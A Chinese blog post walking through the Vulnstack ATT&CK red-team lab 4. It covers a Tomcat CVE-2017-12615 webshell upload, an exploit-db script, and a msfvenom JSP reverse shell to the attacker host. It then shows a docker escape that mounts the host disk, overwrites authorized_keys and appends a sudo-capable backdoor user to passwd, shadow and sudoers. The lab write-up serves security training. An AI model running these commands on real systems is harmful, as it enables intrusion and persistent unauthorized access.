<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="前言Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;6&#x2F; 环境搭建网络拓扑如下：  IP如下： 1234kali linux  192.168.150.141web(ubuntu) 192.168.150.160(外">
<meta property="og:type" content="article">
<meta property="og:title" content="ATT&amp;CK实战系列四">
<meta property="og:url" content="http://imysec.github.io/posts/50306.html">
<meta property="og:site_name" content="忆时光">
<meta property="og:description" content="前言Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;6&#x2F; 环境搭建网络拓扑如下：  IP如下： 1234kali linux  192.168.150.141web(ubuntu) 192.168.150.160(外">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/14/attck45.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck47.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck48.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck49.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck410.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck411.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck412.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck413.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck414.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck415.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck416.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck417.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck418.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck419.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck420.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck421.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck422.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/15/attck423.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck443.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck424.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck425.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck426.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck427.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck428.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck429.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck430.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck431.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck432.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck433.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck434.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck435.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck436.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck437.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck438.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck439.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck440.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck445.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck444.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck441.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck446.png">
<meta property="og:image" content="http://www.sectime.top:8888/images/2020/05/16/attck447.png">
<meta property="article:published_time" content="2020-05-16T08:17:49.000Z">
<meta property="article:modified_time" content="2020-05-16T08:31:43.756Z">
<meta property="article:author" content="ca5tle">
<meta property="article:tag" content="实战">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>ATT&amp;CK实战系列四</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/13593.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/36799.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://imysec.github.io/posts/50306.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://imysec.github.io/posts/50306.html&text=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://imysec.github.io/posts/50306.html&is_video=false&description=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ATT&amp;CK实战系列四&body=Check out this article: http://imysec.github.io/posts/50306.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://imysec.github.io/posts/50306.html&title=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://imysec.github.io/posts/50306.html&name=ATT&amp;CK实战系列四&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://imysec.github.io/posts/50306.html&t=ATT&amp;CK实战系列四" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用msf"><span class="toc-number">3.1.</span> <span class="toc-text">使用msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker逃逸"><span class="toc-number">4.</span> <span class="toc-text">docker逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#横向移动"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">5.1.</span> <span class="toc-text">信息收集</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ATT&amp;CK实战系列四
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ca5tle</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-05-16T08:17:49.000Z" itemprop="datePublished">2020-05-16</time>
        
        (Updated: <time datetime="2020-05-16T08:31:43.756Z" itemprop="dateModified">2020-05-16</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E5%AE%9E%E6%88%98/">实战</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络拓扑如下：</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png" alt="ATT-CK-2.png"></p>
<p>IP如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali linux  192.168.150.141</span><br><span class="line">web(ubuntu) 192.168.150.160(外) 192.168.183.128(内)</span><br><span class="line">win7        192.168.183.129</span><br><span class="line">DC(win2008) 192.168.183.130</span><br></pre></td></tr></table></figure>

<p>进入<code>WEB</code>主机，需要手动使用<code>docker</code>开启服务，分别是<code>strtus2-045</code>、<code>cve-2017-12615</code>、<code>cve-2018-12613</code><br>使用<code>docker</code>需要使用<code>sudo</code>否则没有权限使用，开启后情况如下</p>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>我们先用<code>nmap</code>扫一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;nmap# nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br><span class="line">Failed to open normal output file nmap&#x2F;vulnstack4.nmap for writing</span><br><span class="line">QUITTING!</span><br><span class="line">root@kali:~&#x2F;nmap# cd ..</span><br><span class="line">root@kali:~# nmap -sC -sV -oA nmap&#x2F;vulnstack4 192.168.150.160</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-15 09:40 CST</span><br><span class="line">Nmap scan report for 192.168.150.160</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6d:1e:e7:55:ee:d7:2b:22:d7:6b:68:67:df:39:f5:7b (DSA)</span><br><span class="line">|   2048 5e:ca:2c:70:8f:a2:0c:bf:10:d7:26:2b:15:5f:3f:58 (RSA)</span><br><span class="line">|   256 de:b5:6a:a8:24:6a:13:45:cc:87:21:c3:c2:ee:b2:10 (ECDSA)</span><br><span class="line">|_  256 8e:02:ca:99:6e:c2:eb:8f:0c:5c:bb:c9:b2:f5:06:4d (ED25519)</span><br><span class="line">2002&#x2F;tcp open  http    Apache Tomcat 8.5.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat&#x2F;8.5.19</span><br><span class="line">MAC Address: 00:0C:29:57:73:39 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds</span><br></pre></td></tr></table></figure>

<p>访问<code>http://192.168.150.160:2002/</code>发现是<code>Tomcat</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png" alt="Tomcat"></p>
<p>利用<code>CVE-2017-12615</code>直接<code>put</code>一个冰蝎马上去</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png" alt="attck4-3.png"></p>
<p>这里有几点需要<strong>注意</strong>的：</p>
<ol>
<li>将<code>GET</code>请求改为<code>PUT</code></li>
<li>上传<code>shell</code>的名称后面需要加上<code>/</code>，比如，<code>/shell.jsp/</code></li>
<li>在最后加上要上传的内容，即shell</li>
</ol>
<p>访问<code>http://192.168.150.160:2002/shell.jsp</code>，<code>shell</code>已经成功上传</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png" alt="attck4-4.png"></p>
<p>使用冰蝎成功连接，是<code>root</code>权限</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/14/attck45.png" alt="attck45.png"></p>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>首先搜索一下<code>apache tomcat</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit apache tomcat</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                              |  Path</span><br><span class="line">                                                                                            | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                  | exploits&#x2F;cgi&#x2F;webapps&#x2F;35035.txt</span><br><span class="line">Apache 1.3.x + Tomcat 4.0.x&#x2F;4.1.x mod_jk - Chunked Encoding Denial of Service               | exploits&#x2F;unix&#x2F;dos&#x2F;22068.pl</span><br><span class="line">Apache Commons FileUpload and Apache Tomcat - Denial of Service                             | exploits&#x2F;multiple&#x2F;dos&#x2F;31615.rb</span><br><span class="line">Apache Tomcat (Windows) - &#39;runtime.getRuntime().exec()&#39; Local Privilege Escalation          | exploits&#x2F;windows&#x2F;local&#x2F;7264.txt</span><br><span class="line">......</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal                                         | exploits&#x2F;unix&#x2F;remote&#x2F;14489.c</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#39;utf8&#39; Directory Traversal (PoC)                                   | exploits&#x2F;multiple&#x2F;remote&#x2F;6229.txt</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;windows&#x2F;webapps&#x2F;42953.txt</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck47.png" alt="attck47.png"></p>
<p>找到一个可用的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote C | exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br></pre></td></tr></table></figure>

<p>将payload复制到当前目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit -m exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">  Exploit: Apache Tomcat &lt; 9.0.1 (Beta) &#x2F; &lt; 8.5.23 &#x2F; &lt; 8.0.47 &#x2F; &lt; 7.0.8 - JSP Upload Bypass &#x2F; Remote Code Execution (2)</span><br><span class="line">      URL: https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;42966</span><br><span class="line">     Path: &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;jsp&#x2F;webapps&#x2F;42966.py</span><br><span class="line">File Type: Python script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: &#x2F;root&#x2F;42966.py</span><br></pre></td></tr></table></figure>

<p>然后可以使用<code>42966.py</code>脚本</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck48.png" alt="attck48.png"></p>
<p>用<code>-u</code>参数检测是否存在漏洞</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck49.png" alt="attck49.png"></p>
<p>存在漏洞，访问<code>http://192.168.150.160:2002/Poc.jsp</code>看一下</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck410.png" alt="attck410.png"></p>
<p>我们就用自带的工具利用漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http:&#x2F;&#x2F;192.168.150.160:2002&#x2F; -p pwn</span><br></pre></td></tr></table></figure>

<p>!<img src="http://www.sectime.top:8888/images/2020/05/15/attck411.png" alt="attck411.png"></p>
<p>可看到成功了，并返回一个shell</p>
<p>然后我们去访问上传的<code>pwn.jsp</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck412.png" alt="attck412.png"></p>
<p>在输入框中可执行命令</p>
<h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>参考：<a href="https://daolgts.github.io/2019/10/07/docker安全/" target="_blank" rel="noopener">docker安全</a></p>
<p>使用<code>cve-2019-5736</code>实现<code>docker</code>逃逸  <a href="https://github.com/Frichetten/CVE-2019-5736-PoC" target="_blank" rel="noopener">EXP</a></p>
<p>下载后编辑<code>main.go</code>，将命令改为如下反弹<code>shell</code>命令</p>
<p>6</p>
<p>使用<code>go</code>语言编译，得到<code>main</code>文件</p>
<p>通过冰蝎上传<code>main</code>文件，一执行就卡死，于是反弹<code>shell</code>到<code>kali</code><br>使用冰蝎反弹<code>shell</code>到<code>msf</code>，反弹<code>meterpreter</code>发现进不了<code>shell</code>也无法执行文件，直接反弹<code>shell</code>不能接收</p>
<p>于是使用另外的方式反弹<code>shell</code>，首先使用<code>msf</code>生成一个反弹<code>shell</code>的后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.150.141 LPORT&#x3D;5555 -f raw &gt; shell1.jsp</span><br></pre></td></tr></table></figure>

<p>然后将它通过冰蝎上传到网站根目录<code>/usr/local/tomcat/webapps/ROOT/</code>，执行成功反弹<code>shell</code>，然后运行<code>main</code></p>
<p>输入框中执行<code>ls /dev</code>，可以看到docker虚拟的硬盘</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck413.png" alt="attck412.png"></p>
<p>我们试一下挂载</p>
<p>在根目录创建一个<code>test</code>文件夹，<code>mkdir /test</code></p>
<p><code>mount /dev/sda1 /test</code>，看一下是否挂载成功，<code>ls /test</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck414.png" alt></p>
<p>挂载成功</p>
<p>我们查看一下<code>/home</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck415.png" alt></p>
<p>查看隐藏文件，<code>ls -lah /test/home/ubuntu</code>，可以看到<code>.ssh</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck416.png" alt></p>
<p>查看<code>.ssh</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck417.png" alt></p>
<p>接下来我们就利用ssh实现docker逃逸</p>
<p><code>ssh-keygen -f kali</code>生成私钥</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck418.png" alt></p>
<p><code>chmod 600 kali</code>，不然用不了</p>
<p>这里我们写一个<code>test.sh</code>脚本，方便执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl13XtnQ&#x2F;CEiD7SZLBXR8sbpEb7aXb3CMMpCZabybfg1eXitxiT+V7ypF1v8yjlRVGk7LqVeCD1nGI5d&#x2F;VaDSW3fqe6fxZBH+8nAuuWbt6oEdkndaDuPgSHBZSkGJDQsePq9WOQ1tNUx7v2Jg7pMuIdd9kTQOVgK4xL2KGxddTwmpJCkv1gNn6Vd99ASWLIRKPNYdLvQ4lGAn6gPz39LBfDXaU8ri93HA75IIzz+7nXETfkx6x82vr0GuEmJBmqRRHxAQo8zAl3XC+X&#x2F;tkPrSCr4OH26Rt3dQ9EL+eJJI8hSpWxGfC2uvauFQ8Brx+SuSnUAO9RevbAUyQDXyuI8LXu3vJL2Grw2tb9FDsIAEHtHUZ8o4od6xhyWThiv2hrL8nKHXzpuypTZ6WCznP6inYaCOFpChtU01kHptmzBreNy33HveKxMjKd5338dB4zSaIaaNqPKizjoejk7oRBJkuGyqecrwL3ReToj+FM02QnjK1kESpEspMTuOF5m6vwL0&#x3D; kali@kali&#39; &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">cat &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>

<p>保存，开启一个http服务，在目标下载</p>
<p><code>python -m SimpleHTTPServer</code></p>
<p>在输入框下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.150.141:8000&#x2F;test.sh</span><br></pre></td></tr></table></figure>

<p><code>chmod 777 test.sh</code> ，<code>ls -la</code>看一下</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck419.png" alt></p>
<p>执行<code>test.sh</code>，<code>bash test.sh</code>，成功</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck420.png" alt></p>
<p>在<code>kali</code>上用<code>ssh</code>连接一下，并没有什么用，因为我们不知道密码。。。。</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck421.png" alt></p>
<p>那么我们该怎么办呢？可以添加用户，但不能在输入框中添加，否则添加用户到了<code>docker</code></p>
<p>这里我们可以修改配置文件也可以添加用户</p>
<p>写个脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;passwd</span><br><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;shadow</span><br><span class="line">chmod 777 &#x2F;test&#x2F;etc&#x2F;sudoers</span><br><span class="line">mkdir &#x2F;test&#x2F;home&#x2F;kali</span><br><span class="line">chmod 777 &#x2F;test&#x2F;home&#x2F;kali</span><br><span class="line">echo &#39;kali:x:1001:1000:kali,,,:&#x2F;home&#x2F;kali:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;passwd</span><br><span class="line">echo &#39;kali:$6$dZhS1PQKuhRB3dMq$GVQsHMiD7221rqrnfxGxP6X9Pn271DJ2N299OHzWPoR6SmSQnk7mSK96BP9ZETvqkfFs1HFbMWkxD9kCSX10H1:18397:0:99999:7:::&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;shadow</span><br><span class="line">echo &#39;kali  ALL&#x3D;(ALL:ALL)  ALL&#39; &gt;&gt; &#x2F;test&#x2F;etc&#x2F;sudoers</span><br><span class="line">cat &#x2F;test&#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>

<p>输入框下载，<code>chomd 777 adduser.sh</code>，执行<code>bash adduser.sh</code></p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck422.png" alt></p>
<p>在<code>kali</code>上登录</p>
<p><img src="http://www.sectime.top:8888/images/2020/05/15/attck423.png" alt></p>
